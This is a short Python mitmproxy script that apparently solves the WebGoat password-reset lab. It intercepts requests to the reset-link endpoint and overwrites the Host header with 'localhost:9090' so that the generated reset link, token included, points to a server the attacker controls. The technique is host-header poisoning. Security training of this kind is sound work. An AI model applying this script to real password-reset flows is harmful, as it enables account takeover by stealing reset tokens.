from mitmproxy import http
from mitmproxy import ctx

import requests


def request(flow: http.HTTPFlow) -> None:
  if 'PasswordReset/reset/create-password-reset-link' in flow.request.url:
    flow.request.url = 'http://localhost:8000/WebGoat/PasswordReset/reset/create-password-reset-link'
    flow.request.headers['Host'] = 'localhost:9090'
    print(flow.request.headers)
    print(flow.request.content)